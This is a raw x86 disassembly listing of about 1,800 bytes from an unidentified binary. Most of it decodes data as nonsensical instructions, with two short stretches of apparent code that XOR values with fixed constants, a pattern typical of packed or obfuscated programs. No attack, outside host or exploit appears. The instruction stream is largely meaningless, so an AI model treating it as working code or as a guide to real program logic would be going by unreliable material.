  406d74:	fadd   QWORD PTR [eax-0x1c919c13]
  406d7a:	add    ch,ah
  406d7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d7d:	adc    ecx,ecx
  406d7f:	and    dl,BYTE PTR [edx-0x1b]
  406d82:	cmp    DWORD PTR [ebx+0x683b0278],0xffffff9e
  406d89:	(bad)  
  406d8a:	repnz gs stc 
  406d8d:	rcl    BYTE PTR [esi-0x4],1
  406d90:	adc    al,0x16
  406d92:	in     al,0x9a
  406d94:	imul   edi,ecx,0x3e0bf53
  406d9a:	arpl   cx,si
  406d9c:	xor    DWORD PTR [esi],ebp
  406d9e:	loope  0x406d7c
  406da0:	(bad)  
  406da1:	xchg   esi,eax
  406da2:	jmp    0xe621186c
  406da7:	cmp    edi,0x8d8c1abd
  406dad:	or     al,0xd2
  406daf:	out    dx,al
  406db0:	out    0x4,al
  406db2:	call   0x7929c76b
  406db7:	in     eax,dx
  406db8:	cld    
  406db9:	fwait
  406dba:	mov    al,ds:0x138cf305
  406dbf:	jno    0x406db7
  406dc1:	nop
  406dc2:	xor    eax,0x577d1102
  406dc7:	adc    eax,0xfa595c02
  406dcc:	xor    cl,BYTE PTR [eax]
  406dce:	retf   0x4f83
  406dd1:	call   0x25cf:0x2f296820
  406dd8:	adc    dl,bl
  406dda:	inc    eax
  406ddb:	lahf   
  406ddc:	or     eax,0x6828a9d6
  406de1:	jl     0x406db5
  406de3:	fist   DWORD PTR [ecx-0x7345ac1c]
  406de9:	jl     0x406d7b
  406deb:	(bad)  
  406dec:	pop    edx
  406ded:	push   ebp
  406dee:	aas    
  406def:	jge    0x406d96
  406df1:	jp     0x406e19
  406df3:	sbb    ecx,eax
  406df5:	imul   ecx,DWORD PTR [esi+0x60beb92b],0xbeedfba4
  406dff:	xchg   esi,eax
  406e00:	mov    WORD PTR [esi-0x45],fs
  406e03:	scas   eax,DWORD PTR es:[edi]
  406e04:	(bad)  
  406e05:	mov    eax,0x7313971d
  406e0a:	call   0xa1b6:0xe4993cc3
  406e11:	test   al,0x83
  406e13:	arpl   WORD PTR [eax+edi*8-0x62],bp
  406e17:	loopne 0x406e1e
  406e19:	mov    ebp,0x6530e197
  406e1e:	ins    BYTE PTR es:[edi],dx
  406e1f:	dec    ecx
  406e20:	popa   
  406e21:	or     eax,0x1629e7ca
  406e26:	jno    0x406de9
  406e28:	sti    
  406e29:	std    
  406e2a:	adc    bl,bh
  406e2c:	(bad)  
  406e2d:	xchg   ecx,eax
  406e2e:	cmp    eax,0x49f82142
  406e33:	pop    ebx
  406e34:	push   es
  406e35:	push   esi
  406e36:	mov    ecx,DWORD PTR [ebx]
  406e38:	outs   dx,BYTE PTR ds:[esi]
  406e39:	into   
  406e3a:	neg    BYTE PTR [ebx+0x55]
  406e3d:	aam    0xe8
  406e3f:	sahf   
  406e40:	sar    cl,cl
  406e42:	in     eax,0x38
  406e44:	push   cs
  406e45:	test   al,0x66
  406e47:	int    0x5a
  406e49:	into   
  406e4a:	mov    ds:0x55895264,eax
  406e4f:	adc    BYTE PTR [ebx+0x76350456],cl
  406e55:	mov    ch,0x79
  406e57:	retf   
  406e58:	mov    DWORD PTR [ebp+0x14],edx
  406e5b:	cmp    eax,DWORD PTR [ebp+0x10]
  406e5e:	jne    0x407653
  406e64:	mov    eax,edx
  406e66:	cmp    DWORD PTR [ebp+0xc],eax
  406e69:	jne    0x407653
  406e6f:	mov    eax,DWORD PTR [esi]
  406e71:	mov    edx,DWORD PTR [esi+0x4]
  406e74:	mov    eax,DWORD PTR [esi]
  406e76:	mov    edx,DWORD PTR [esi+0x4]
  406e79:	mov    edx,eax
  406e7b:	xor    eax,eax
  406e7d:	shl    edx,0x1e
  406e80:	mov    DWORD PTR [ebp+0x10],eax
  406e83:	mov    eax,DWORD PTR [esi]
  406e85:	xor    edx,0x80000000
  406e8b:	mov    DWORD PTR [ebp+0x14],edx
  406e8e:	mov    edx,DWORD PTR [esi+0x4]
  406e91:	xor    eax,0xcb79b577
  406e96:	xor    ecx,edx
  406e98:	shrd   eax,ecx,0x2
  406e9c:	or     eax,DWORD PTR [ebp+0x10]
  406e9f:	shr    ecx,0x2
  406ea2:	mov    DWORD PTR [ebp+0x8],eax
  406ea5:	mov    eax,ecx
  406ea7:	or     eax,DWORD PTR [ebp+0x14]
  406eaa:	mov    ecx,DWORD PTR [ebx]
  406eac:	mov    edx,DWORD PTR [ebx+0x4]
  406eaf:	push   eax
  406eb0:	push   DWORD PTR [ebp+0x8]
  406eb3:	push   edx
  406eb4:	push   ecx
  406eb5:	call   0x41594e
  406eba:	mov    eax,DWORD PTR [esi]
  406ebc:	mov    ecx,DWORD PTR [esi+0x4]
  406ebf:	shrd   eax,ecx,0x2
  406ec3:	shr    ecx,0x2
  406ec6:	shr    edx,0x1e
  406ec9:	xor    ecx,0xe70ae2ba
  406ecf:	push   ecx
  406ed0:	xor    eax,edi
  406ed2:	mov    DWORD PTR [ebp+0x10],edx
  406ed5:	mov    edx,DWORD PTR [ebx]
  406ed7:	mov    edi,DWORD PTR [ebx+0x4]
  406eda:	push   eax
  406edb:	push   edi
  406edc:	push   edx
  406edd:	call   0x41594e
  406ee2:	shld   edx,eax,0x2
  406ee6:	mov    ecx,edx
  406ee8:	xor    edx,edx
  406eea:	or     ecx,edx
  406eec:	mov    edx,DWORD PTR [esi]
  406eee:	mov    edi,DWORD PTR [esi+0x4]
  406ef1:	shl    eax,0x2
  406ef4:	or     eax,DWORD PTR [ebp+0x10]
  406ef7:	jmp    0x407298
  406efc:	test   al,0xc
  406efe:	lea    ebp,[esi]
  406f00:	mov    cl,0xbc
  406f02:	test   al,0x9c
  406f04:	sahf   
  406f05:	cld    
  406f06:	lds    esp,FWORD PTR [esp+ebp*1-0x415b432b]
  406f0d:	dec    ecx
  406f0e:	mov    esi,0xbec4bdbe
  406f13:	mov    esi,0x91ae189f
  406f18:	out    0xee,al
  406f1a:	out    0x40,eax
  406f1c:	retf   
  406f1d:	ret    0xe81c
  406f20:	daa    
  406f21:	pop    ebp
  406f22:	or     ebx,ecx
  406f24:	(bad)  
  406f25:	(bad)  [edi-0x13c3633b]
  406f2b:	inc    eax
  406f2c:	clc    
  406f2d:	sub    DWORD PTR [ecx],edi
  406f2f:	inc    ebx
  406f30:	and    eax,0xae489ff3
  406f35:	iret   
  406f36:	jecxz  0x406ebb
  406f38:	push   edi
  406f39:	pusha  
  406f3a:	and    esp,DWORD PTR ds:[ebx]
  406f3d:	xchg   edx,eax
  406f3e:	mov    cl,0x29
  406f40:	xchg   esi,eax
  406f41:	mov    dh,0x6f
  406f43:	pop    edi
  406f44:	in     al,0xc2
  406f46:	ss dec eax
  406f48:	pusha  
  406f49:	icebp  
  406f4a:	idiv   BYTE PTR [edi]
  406f4c:	or     al,0x3a
  406f4e:	aaa    
  406f4f:	popf   
  406f50:	jno    0x406fb4
  406f52:	fstp   TBYTE PTR [eax+0x17]
  406f55:	repnz or ebx,0xffffffe6
  406f59:	xor    DWORD PTR fs:[ecx],ecx
  406f5c:	pop    ebx
  406f5d:	dec    esp
  406f5e:	test   al,0xd6
  406f60:	retf   0x7f3d
  406f63:	(bad)  
  406f65:	jmp    0x406fe0
  406f67:	and    ebp,0xc407cabb
  406f6d:	xor    DWORD PTR [ebx],eax
  406f6f:	and    al,0xfd
  406f71:	cmp    ah,BYTE PTR [edi+0x4]
  406f74:	inc    edx
  406f75:	in     al,0xdc
  406f77:	and    al,al
  406f79:	xlat   BYTE PTR ds:[ebx]
  406f7a:	jle    0x406f76
  406f7c:	cmp    cl,cl
  406f7e:	lds    ebp,FWORD PTR [edi-0x23]
  406f81:	shr    BYTE PTR [edi+esi*1],0x95
  406f85:	inc    edx
  406f86:	push   0x5d
  406f88:	aam    0x2c
  406f8a:	push   ebx
  406f8b:	mov    al,ds:0x9e7b0912
  406f90:	test   BYTE PTR [edx-0x33],0x99
  406f94:	push   ds
  406f95:	sub    DWORD PTR gs:[edx-0x30b49c0d],esp
  406f9c:	cmp    dl,bl
  406f9e:	xor    edx,DWORD PTR [edx]
  406fa0:	cwde   
  406fa1:	es sar cl,cl
  406fa4:	out    dx,al
  406fa5:	in     al,0xdd
  406fa7:	stc    
  406fa8:	fldcw  WORD PTR [edx-0x4d530857]
  406fae:	out    dx,eax
  406faf:	jmp    0x406f93
  406fb1:	or     BYTE PTR [esi+0xf3cd14e],cl
  406fb7:	jp     0x406f6e
  406fb9:	icebp  
  406fba:	rcl    BYTE PTR [ebx+edi*1-0x5f],0x17
  406fbf:	jnp    0x406f4f
  406fc1:	cmp    eax,0xf3d51263
  406fc6:	stos   BYTE PTR es:[edi],al
  406fc7:	shl    dh,1
  406fc9:	(bad)  
  406fca:	jg     0x406fcb
  406fcc:	add    DWORD PTR [ebp-0x7c],ebp
  406fcf:	pop    esp
  406fd0:	add    ebx,ebx
  406fd2:	adc    DWORD PTR [edx],ebp
  406fd4:	test   DWORD PTR [ebx],esp
  406fd6:	dec    esi
  406fd7:	mov    DWORD PTR [esi-0x7f6a587],edi
  406fdd:	pop    esi
  406fde:	rol    DWORD PTR [ecx+eax*1-0x1a],cl
  406fe2:	and    al,0xb2
  406fe4:	aad    0x8a
  406fe6:	jb     0x407031
  406fe8:	fcmove st,st(4)
  406fea:	frstor [edi]
  406fec:	xchg   edi,eax
  406fed:	mov    ah,0x5e
  406fef:	mov    BYTE PTR [esi+eax*4+0x4dd96f50],dl
  406ff6:	sbb    edi,DWORD PTR [esi-0x7e589664]
  406ffc:	and    al,0x20
  406ffe:	and    al,0x5c
  407000:	loope  0x40705c
  407002:	outs   dx,BYTE PTR ds:[esi]
  407003:	cmp    al,0x8f
  407005:	ret    
  407006:	retf   0x981a
  407009:	loop   0x406f92
  40700b:	mov    bh,0xeb
  40700d:	sub    DWORD PTR [esi-0x41a7c5f],ecx
  407013:	jecxz  0x407037
  407015:	ins    BYTE PTR es:[edi],dx
  407016:	mov    ds:0xaf0963c1,eax
  40701b:	mov    ecx,0xeca3e0fe
  407020:	out    0xb5,al
  407022:	inc    edi
  407023:	jno    0x40702d
  407025:	or     bh,dh
  407027:	adc    dl,BYTE PTR [ebx-0x18]
  40702a:	jbe    0x406fca
  40702c:	or     edi,DWORD PTR [esp+0x2786bc1]
  407033:	and    eax,0x318e3135
  407038:	and    ecx,DWORD PTR [esi-0x363856ba]
  40703e:	cld    
  40703f:	or     BYTE PTR [edx],dh
  407041:	jp     0x40708b
  407043:	sbb    BYTE PTR [ecx-0x3ee434c4],al
  407049:	mov    ds:0x8ebfdee8,al
  40704e:	cmp    cl,BYTE PTR [ecx+ecx*1]
  407051:	ins    BYTE PTR es:[edi],dx
  407052:	call   0xb601:0x63ab7607
  407059:	jmp    0x407077
  40705b:	xor    ebp,DWORD PTR [ebp-0x408430f2]
  407061:	mov    ebp,0x2486f93d
  407066:	out    0x1f,al
  407068:	fimul  WORD PTR [eax]
  40706a:	repnz fisub DWORD PTR ds:0xf6a73fb2
  407071:	std    
  407072:	dec    edi
  407073:	sbb    BYTE PTR [ecx+0x70],ah
  407076:	(bad)  
  407077:	jnp    0x4070f5
  407079:	fst    DWORD PTR [ebx+0x17]
  40707c:	fild   QWORD PTR [ebx]
  40707e:	lahf   
  40707f:	nop
  407080:	push   es
  407081:	add    eax,0xd5d2d729
  407086:	xchg   ecx,eax
  407087:	in     al,0x94
  407089:	scas   al,BYTE PTR es:[edi]
  40708a:	xchg   edi,eax
  40708b:	jne    0x40702e
  40708d:	sbb    DWORD PTR [edi-0x70],esp
  407090:	inc    edi
  407091:	mov    esp,0xdc3ef7a0
  407096:	lea    ecx,[ecx]
  407098:	out    dx,eax
  407099:	xchg   DWORD PTR [ebp+ecx*1-0x4903944f],ebx
  4070a0:	or     DWORD PTR [ebx+edx*1+0x39],0x7246f1be
  4070a8:	push   es
  4070a9:	sahf   
  4070aa:	jb     0x4070e0
  4070ac:	daa    
  4070ad:	adc    DWORD PTR [edx-0x9e0d572],edi
  4070b3:	sti    
  4070b4:	fstp   TBYTE PTR [ebp-0x5b86ec51]
  4070ba:	test   al,0x9f
  4070bc:	xor    eax,0x94003128
  4070c1:	xchg   ebp,eax
  4070c2:	sub    eax,0x25a4fa5a
  4070c7:	sbb    DWORD PTR [ebp+ebx*2-0x2c],esp
  4070cb:	sbb    al,0x4e
  4070cd:	rep ins BYTE PTR es:[edi],dx
  4070cf:	cmp    al,0x82
  4070d1:	adc    esi,DWORD PTR [esi-0x3c]
  4070d4:	mov    dh,0x24
  4070d6:	jnp    0x407088
  4070d8:	and    DWORD PTR [edx-0x29414a20],ebp
  4070de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070df:	mov    BYTE PTR [edx+0x6a3d38dd],0x74
  4070e6:	adc    DWORD PTR [esi+0x3f],0xffffff9a
  4070ea:	(bad)  
  4070eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070ec:	in     al,dx
  4070ed:	mov    ah,0x76
  4070ef:	mov    eax,0xf98b8f26
  4070f4:	add    edx,edx
  4070f6:	data16 jl 0x40710e
  4070f9:	das    
  4070fa:	in     eax,dx
  4070fb:	(bad)  
  4070fd:	jmp    0xa3ea8f6d
  407102:	test   ecx,ebx
  407104:	pop    esp
  407105:	push   0x8e59675d
  40710a:	in     eax,dx
  40710b:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40710d:	popa   
  40710e:	xchg   BYTE PTR [esi],dh
  407110:	adc    DWORD PTR [ebp+ecx*1-0x4b],ebp
  407114:	arpl   cx,bx
  407116:	pop    esp
  407117:	lds    eax,FWORD PTR [edx-0x316224fd]
  40711d:	jle    0x40714c
  40711f:	(bad)  
  407120:	sbb    BYTE PTR [eax+esi*4+0x6fe52ce5],al
  407127:	je     0x407167
  407129:	sbb    al,0x7f
  40712b:	jg     0x4070b3
  40712d:	(bad)  
  40712e:	mov    bh,0x78
  407130:	xchg   DWORD PTR ds:0x2ac015a6,esi
  407136:	jecxz  0x40718e
  407138:	and    al,0x3a
  40713a:	xchg   edi,eax
  40713b:	ret    0x5cb3
  40713e:	mov    eax,0x1fa0c0b5
  407143:	shl    BYTE PTR [ebp-0x35f26991],cl
  407149:	(bad)  
  40714b:	in     eax,dx
  40714c:	(bad)  
  40714e:	jg     0x4071cf
  407150:	(bad)  
  407151:	repnz in eax,0x50
  407154:	test   al,0xaa
  407156:	cli    
  407157:	hlt    
  407158:	jns    0x4070db
  40715a:	outs   dx,BYTE PTR ds:[esi]
  40715b:	sub    al,0xb0
  40715d:	xor    dl,BYTE PTR [ecx-0x62]
  407160:	out    dx,eax
  407161:	dec    ecx
  407162:	pop    esi
  407163:	std    
  407164:	jge    0x407187
  407166:	push   ebp
  407167:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407168:	out    dx,eax
  407169:	xor    ecx,DWORD PTR [edx]
  40716b:	and    dl,BYTE PTR [ebx+0x26]
  40716e:	fadd   DWORD PTR [esi+0x71]
  407171:	sbb    cl,BYTE PTR [edx+0x20cd469]
  407177:	inc    ebx
  407178:	push   ebp
  407179:	outs   dx,BYTE PTR ds:[esi]
  40717a:	or     BYTE PTR [ecx+0x2b028939],bl
  407180:	adc    al,0x7d
  407182:	rol    DWORD PTR [esi+eiz*1],0x93
  407186:	cmc    
  407187:	scas   al,BYTE PTR es:[edi]
  407188:	icebp  
  407189:	mov    bh,0xd
  40718b:	push   ss
  40718c:	sub    bl,BYTE PTR [ebp+0x1259eb32]
  407192:	clc    
  407193:	stc    
  407194:	outs   dx,DWORD PTR ds:[esi]
  407195:	(bad)  
  407196:	pop    edi
  407197:	call   DWORD PTR [ecx]
  407199:	add    esp,edx
  40719b:	cmp    BYTE PTR [edi],ah
  40719d:	jno    0x407133
  40719f:	repz xor eax,0xcad8774d
  4071a5:	and    ah,BYTE PTR [eax+0x644dd2e]
  4071ab:	ret    0xee9d
  4071ae:	xchg   ebp,eax
  4071af:	in     al,0x63
  4071b1:	cmp    BYTE PTR [ebx],dh
  4071b3:	mov    dh,BYTE PTR ss:[ebx]
  4071b6:	adc    BYTE PTR [ecx+0x56cc7c89],ah
  4071bc:	in     eax,0xe8
  4071be:	mov    dl,dh
  4071c0:	lock out 0x6b,eax
  4071c3:	xchg   edx,eax
  4071c4:	mov    dh,0x90
  4071c6:	out    dx,eax
  4071c7:	into   
  4071c8:	rcl    ebp,0x9c
  4071cb:	sbb    al,0xa2
  4071cd:	pop    ebp
  4071ce:	fwait
  4071cf:	call   0xe0a0:0x7ff2f8d7
  4071d6:	sbb    eax,0x1b819ca9
  4071db:	into   
  4071dc:	pop    eax
  4071dd:	push   ecx
  4071de:	js     0x407160
  4071e0:	adc    ebx,DWORD PTR [ebx+0x62]
  4071e3:	div    DWORD PTR [ebx+ebp*2+0x39]
  4071e7:	rcl    BYTE PTR [ecx-0x76],cl
  4071ea:	mov    bh,0x14
  4071ec:	xchg   ebp,eax
  4071ed:	clc    
  4071ee:	push   cs
  4071ef:	push   es
  4071f0:	and    al,BYTE PTR [ecx]
  4071f2:	stos   BYTE PTR es:[edi],al
  4071f3:	fstp   TBYTE PTR [edi+0x2a]
  4071f6:	mov    cs,WORD PTR [esi-0x18]
  4071f9:	outs   dx,DWORD PTR ds:[esi]
  4071fa:	adc    BYTE PTR [ebp-0x5da124cb],dl
  407200:	enter  0xd51a,0x35
  407204:	leave  
  407205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407206:	push   esi
  407207:	adc    al,cl
  407209:	or     eax,0xf2dd6db6
  40720e:	and    esp,0x3f7b378f
  407214:	mov    cl,0xe9
  407216:	or     esi,esp
  407218:	rol    edi,0xa8
  40721b:	mov    al,ds:0x9d0a0b45
  407220:	xor    ecx,DWORD PTR [ebx+ebx*4]
  407223:	iret   
  407224:	fild   DWORD PTR [ebx+edi*2+0x5103212a]
  40722b:	xor    eax,0x9ff8d82e
  407230:	push   ebx
  407231:	xchg   esp,eax
  407232:	aas    
  407233:	jecxz  0x4071d0
  407235:	(bad)  
  407236:	(bad)  
  407237:	pop    ebp
  407238:	and    al,0xe
  40723a:	push   es
  40723b:	stos   BYTE PTR es:[edi],al
  40723c:	sbb    al,0x43
  40723e:	and    al,0x9a
  407240:	jo     0x407265
  407242:	out    dx,eax
  407243:	pop    ss
  407244:	jecxz  0x4071c6
  407246:	daa    
  407247:	lods   eax,DWORD PTR ds:[esi]
  407248:	jno    0x407256
  40724a:	data16 mov cl,0xf2
  40724d:	pop    edx
  40724e:	mov    al,0x2d
  407250:	adc    dh,BYTE PTR ds:0x2bdd04ec
  407256:	sbb    BYTE PTR [ebp+0x6e],al
  407259:	dec    esi
  40725a:	call   0x1704:0x2f5d5a0c
  407261:	sub    dl,bl
  407263:	xchg   DWORD PTR [edx-0x2b],ebx
  407266:	mov    bh,0x77
  407268:	cmc    
  407269:	mov    ebp,0x28e9943d
  40726e:	fs sub eax,0x850abb54
  407274:	fisttp DWORD PTR [edx-0x10e8b6bc]
  40727a:	call   0xc6a6:0xedc4e773
  407281:	cmp    BYTE PTR ss:[edi+0x8707ee4],al
  407288:	jl     0x407298
  40728a:	sbb    bh,BYTE PTR [eax+0x50]
  40728d:	mov    ecx,0xfebdd73e
  407292:	jns    0x407303
  407294:	pop    edx
  407295:	add    DWORD PTR [eax-0x3d],esp
  407298:	xor    edi,ecx
  40729a:	xor    edx,eax
  40729c:	xor    edx,0xcb79b576
  4072a2:	xor    edi,0x9c2b8ae8
  4072a8:	mov    DWORD PTR [esi],edx
  4072aa:	jmp    0x40764b
  4072af:	mov    bl,0xe6
  4072b1:	ds lahf 
  4072b3:	pushf  
  4072b4:	test   al,0xb4
  4072b6:	stc    
  4072b7:	jo     0x4072e0
  4072b9:	inc    edx
  4072ba:	fld    QWORD PTR [esi]
  4072bc:	ss pop esi
  4072be:	sahf   
  4072bf:	mov    ebp,0xbdbebe4f
  4072c4:	les    edi,FWORD PTR [esi+0x459737be]
  4072ca:	mov    DWORD PTR [edx-0x1c],ebx
  4072cd:	dec    edi
  4072ce:	pop    edx
  4072cf:	xchg   ebx,eax
  4072d0:	cdq    
  4072d1:	mov    edx,0xcde0837b
  4072d6:	adc    esi,DWORD PTR [edx+0x7a]
  4072d9:	xor    ah,BYTE PTR [edi]
  4072db:	cmc    
  4072dc:	xchg   cl,cl
  4072de:	xchg   edx,eax
  4072df:	int3   
  4072e0:	scas   al,BYTE PTR es:[edi]
  4072e1:	add    ah,ch
  4072e3:	jbe    0x40731c
  4072e5:	fist   WORD PTR [ebp-0x152c496b]
  4072eb:	test   al,0x8e
  4072ed:	sbb    eax,0xd0494c61
  4072f2:	out    0x3c,al
  4072f4:	xor    BYTE PTR [eax-0x3afdd082],0x3a
  4072fb:	push   edx
  4072fc:	pop    es
  4072fd:	sbb    edx,DWORD PTR [edx+ebp*4+0x4c987793]
  407304:	pusha  
  407305:	scas   eax,DWORD PTR es:[edi]
  407306:	popa   
  407307:	push   esp
  407308:	mul    BYTE PTR [esi+0x4e705aab]
  40730e:	and    al,0x94
  407310:	mov    bl,0xef
  407312:	cmp    al,BYTE PTR [edx-0x18]
  407315:	pop    ebp
  407316:	fstp   QWORD PTR [esi]
  407318:	out    0x65,eax
  40731a:	jmp    0x407305
  40731c:	fild   QWORD PTR [ebx]
  40731e:	lods   al,BYTE PTR ds:[esi]
  40731f:	popf   
  407320:	scas   al,BYTE PTR es:[edi]
  407321:	add    edi,DWORD PTR [edi+eax*2]
  407324:	popf   
  407325:	cld    
  407326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407327:	mov    edi,0x4be3bc84
  40732c:	cmp    BYTE PTR ds:0x2831a921,cl
  407332:	jecxz  0x407353
  407334:	or     eax,0x611c3f54
  407339:	push   0x68
  40733b:	fisubr DWORD PTR [edx+edx*1-0xa]
  40733f:	in     al,0x3
  407341:	mov    ebp,DWORD PTR [ebx+0x72c4178f]
  407347:	clc    
  407348:	(bad)  
  407349:	in     al,dx
  40734a:	xchg   ecx,eax
  40734b:	pop    esi
  40734c:	adc    eax,0x41f1cf90
  407351:	inc    ebp
  407352:	ret    0x6d97
  407355:	in     eax,dx
  407356:	fsub   DWORD PTR [esi+0x6d]
  407359:	adc    esi,DWORD PTR [edx-0x15]
  40735c:	imul   esp,DWORD PTR [edx+edx*2+0x29],0x89a2a85d
  407364:	in     al,0x5e
  407366:	xchg   ebp,eax
  407367:	jecxz  0x4073ce
  407369:	add    BYTE PTR [ebx-0x2d],bl
  40736c:	ins    DWORD PTR es:[edi],dx
  40736d:	add    eax,ebx
  40736f:	pop    edx
  407370:	xlat   BYTE PTR ds:[ebx]
  407371:	daa    
  407372:	out    dx,eax
  407373:	jg     0x40739c
  407375:	push   ds
  407376:	xor    al,0x91
  407378:	mov    BYTE PTR [esi-0x71],al
  40737b:	(bad)  
  40737c:	test   eax,0xa0f57af2
  407381:	test   eax,0x6940597a
  407386:	add    eax,0x414d6d5c
  40738b:	es mov dh,0xaa
  40738e:	xor    edi,DWORD PTR [edi+ecx*4-0x30a16175]
  407395:	sbb    ah,BYTE PTR [ebx-0x28]
  407398:	imul   ebp,DWORD PTR [ebx+0x73],0x5a
  40739c:	push   ebx
  40739d:	ss std 
  40739f:	fxch   st(4)
  4073a1:	gs xor eax,0xca9e5470
  4073a7:	mov    ecx,0x3529b8cb
  4073ac:	jl     0x40733a
  4073ae:	invd   
  4073b0:	bound  esi,QWORD PTR [ebp+esi*8+0x6d55d65c]
  4073b7:	outs   dx,DWORD PTR ds:[esi]
  4073b8:	call   0x249bd256
  4073bd:	adc    ah,bl
  4073bf:	jno    0x4073fb
  4073c1:	pop    edi
  4073c2:	outs   dx,BYTE PTR ds:[esi]
  4073c3:	mov    WORD PTR [edi-0x6],gs
  4073c6:	inc    ebp
  4073c7:	stc    
  4073c8:	xor    eax,0x9889c5d5
  4073cd:	cmp    ah,0x81
  4073d0:	fs inc esp
  4073d2:	addr16 xor eax,0x6d7196ad
  4073d8:	or     DWORD PTR gs:[esi-0x56cd7a19],ecx
  4073df:	(bad)  
  4073e0:	xlat   BYTE PTR ds:[ebx]
  4073e1:	fsub   QWORD PTR [eax+0x637f285b]
  4073e7:	repnz jecxz 0x4073c1
  4073ea:	pop    ebx
  4073eb:	pop    esi
  4073ec:	ret    0x5bbe
  4073ef:	adc    dl,bl
  4073f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073f2:	push   esp
  4073f3:	xor    DWORD PTR [ecx+0x36],ebx
  4073f6:	mov    esp,0xf283962f
  4073fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073fc:	sbb    cl,BYTE PTR [edi]
  4073fe:	mov    edi,0x3b005327
  407403:	cld    
  407404:	adc    al,BYTE PTR [eax+edx*2-0x4ec60e8a]
  40740b:	or     DWORD PTR [edx],0xd1033385
  407411:	in     eax,dx
  407412:	xlat   BYTE PTR ds:[ebx]
  407413:	lds    edi,FWORD PTR [eax-0x63f84b84]
  407419:	sar    DWORD PTR [esi+0x8b5b5a2],cl
  40741f:	iret   
  407420:	and    eax,DWORD PTR [esi+0x78]
  407423:	sbb    BYTE PTR [edi],0xa4
  407426:	push   esi
  407427:	test   DWORD PTR [ebp-0x5],edi
  40742a:	jns    0x407432
  40742c:	repz adc DWORD PTR [edx+0x38],ebp
  407430:	lea    esp,ds:0xf24d7b7
  407436:	cmp    DWORD PTR [edx],edx
  407438:	jnp    0x4074a5
  40743a:	gs nop
  40743c:	aad    0xf4
  40743e:	cld    
  40743f:	mov    ch,0x83
  407441:	ret    
  407442:	test   al,0x49
  407444:	popf   
  407445:	mov    ds:0x77d11ae8,eax
  40744a:	je     0x40743a
  40744c:	push   edi
  40744d:	es out 0xeb,eax
  407450:	jg     0x40748a
  407452:	js     0x40745f
  407454:	dec    ecx
  407455:	xor    esi,DWORD PTR [edi-0x73a4c22e]
  40745b:	nop
  40745c:	scas   al,BYTE PTR es:[edi]
  40745d:	and    ax,0x4f5f
  407461:	mov    WORD PTR [eax-0x43095879],es
  407467:	je     0x407404
  407469:	repnz dec ecx
  40746b:	dec    edi
  40746c:	pop    edx
  40746d:	xchg   BYTE PTR [edi+ebx*1-0x14],dl
  407471:	cmc    
  407472:	aad    0x3e
  407474:	jecxz  0x4074d7
  407476:	jmp    0x407493
  407478:	mov    esp,DWORD PTR [edi+0x77]
  40747b:	xor    DWORD PTR [ecx-0x5b],esi
  40747e:	popf   
  40747f:	es push cs
  407481:	popf   
  407482:	fwait
  407483:	shl    BYTE PTR [esi-0x5412153],0x6a
  40748a:	or     al,0x41
  40748c:	cmp    esp,edx
  40748e:	pushf  
  40748f:	xchg   edi,eax
  407490:	pop    ecx
  407491:	sbb    BYTE PTR [ebx],cl
  407493:	push   ebp
  407494:	xchg   BYTE PTR [ebx+0x7f7e7363],bh
  40749a:	in     al,0x8d
  40749c:	xchg   esp,eax
  40749d:	ds ret 
  40749f:	cmp    esi,DWORD PTR [ebp+eax*2+0x1a503a15]
  4074a6:	add    BYTE PTR [ebp+0x9],bl
  4074a9:	cmp    esi,ebp
  4074ab:	pop    edi
  4074ac:	dec    edx
  4074ad:	xchg   bp,ax
  4074af:	or     DWORD PTR [ebx],esp
  4074b1:	inc    ecx
  4074b2:	clc    
  4074b3:	cmp    BYTE PTR [eax+0x9],bl
  4074b6:	and    DWORD PTR [ebx+0x21],0x8569ca18
  4074bd:	add    DWORD PTR [ecx-0x61954bf1],esp
  4074c3:	mov    eax,0x5d164af4
  4074c8:	fsubp  st(0),st
  4074ca:	popf   
  4074cb:	cmc    
  4074cc:	icebp  
  4074cd:	call   0x16d8:0x15b9ff6a
  4074d4:	(bad)  
  4074d5:	in     eax,dx
  4074d6:	jo     0x40751e
  4074d8:	ror    BYTE PTR [edi],1
  4074da:	and    DWORD PTR [ecx-0x79],edi
  4074dd:	cmp    DWORD PTR [edx+edi*8+0x17],ecx
  4074e1:	test   eax,0x3cd3771f
  4074e6:	pop    ecx
  4074e7:	xlat   BYTE PTR ds:[ebx]
  4074e8:	ins    DWORD PTR es:[edi],dx
  4074e9:	shl    dh,0x27
  4074ec:	push   0x1506a2b4
  4074f1:	sbb    eax,0x438bcb1b
  4074f6:	in     eax,dx
  4074f7:	sub    dl,BYTE PTR [edx-0x6ed22c4c]
  4074fd:	(bad)  
  4074fe:	mov    esi,0xd064f392
  407503:	inc    DWORD PTR [edx+esi*4-0x72]
  407507:	and    BYTE PTR gs:[edi],bh
  40750a:	xor    DWORD PTR [edi+ebp*1-0x54],esi
  40750e:	shr    DWORD PTR [ecx],0x3
  407511:	xor    al,0x3b
  407513:	sub    dl,bh
  407515:	dec    ebx
  407516:	cmp    al,0x21
  407518:	popa   
  407519:	loop   0x407520
  40751b:	rcr    al,1
  40751d:	inc    ebx
  40751e:	mov    ebp,0x5b00370c
  407523:	in     eax,dx
  407524:	pop    edx
  407525:	dec    ecx
  407526:	ja     0x4074cf
  407528:	fwait
  407529:	dec    esp
  40752a:	retf   
  40752b:	mov    edx,0x1b8bafbd
  407530:	loop   0x4074e5
  407532:	enter  0x72f,0xc1
  407536:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407537:	push   ebx
  407538:	sub    al,dl
  40753a:	xchg   DWORD PTR [edx],ebp
  40753c:	and    edi,DWORD PTR [esi-0x7c]
  40753f:	jae    0x4074f7
  407541:	aaa    
  407542:	lock xor ch,al
  407545:	mov    cl,0x23
  407547:	sbb    esp,DWORD PTR [ebp-0x7947698]
  40754d:	or     BYTE PTR [ecx],bh
  40754f:	out    dx,eax
  407550:	jo     0x407552
  407552:	push   0xad40a0f2
  407557:	xor    eax,0x4f2778bc
  40755c:	out    dx,eax
  40755d:	dec    edx
  40755e:	test   eax,0x5862b8fa
